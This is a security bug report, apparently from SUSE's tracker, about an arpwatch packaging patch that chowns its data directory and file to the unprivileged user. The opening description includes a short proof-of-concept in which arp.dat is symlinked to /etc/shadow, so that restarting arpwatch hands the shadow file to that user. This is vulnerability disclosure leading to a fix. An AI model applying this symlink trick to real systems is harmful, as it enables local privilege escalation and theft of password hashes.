| [Description](show_bug.cgi?id=1186240#c0)  Johannes Segitz   2021-05-19 11:25:35 UTC  ``` while preparing the first major update I noticed this while rebasing the existing patches.  /var/lib/arpwatch is packaged as root:root. Once arpwatch was run with a unprivileged user the ownership is changed to the unprivileged user  $ arpwatch -u johannes -d $ ls -lad /var/lib/arpwatch drwxr-xr-x 2 johannes users 4096 May 19 13:18 /var/lib/arpwatch  arpwatch-2.1a11-drop-privs.dif adds a "dropprivileges" function that does this +               if ( chown ( arpfile, pw->pw_uid, pw->pw_gid) != 0 || +                       chown ( arpfiledir, pw->pw_uid, pw->pw_gid) != 0  ) { +                       syslog(LOG_ERR, "Fatal: could not chown %s and %s to %d,%d).", +                               arpfiledir,arpfile, pw->pw_uid, pw->pw_gid); +                       exit(1); +               }  which allows the user specified to escalate to root the next time arpwatch is started.  As user: # id uid=1000(johannes) gid=100(users) groups=100(users) # pwd /var/lib/arpwatch # rm arp.dat # ln -s /etc/shadow arp.dat  Start arpwatch again, after that /etc/shadow is owned by johannes -rw-r----- 1 johannes users 1.3K May 17 17:08 /etc/shadow ``` [Comment 3](show_bug.cgi?id=1186240#c3)  Johannes Segitz   2021-06-11 11:58:35 UTC  ``` I have a patch that I'm testing and will likely submit today to maintenance ``` [Comment 5](show_bug.cgi?id=1186240#c5)  Robert Frohl   2021-06-28 13:47:26 UTC  ``` public via SUSE release ``` [Comment 6](show_bug.cgi?id=1186240#c6)  Swamp Workflow Management   2021-06-28 19:18:50 UTC  ``` SUSE-SU-2021:14759-1: An update that fixes one vulnerability is now available.
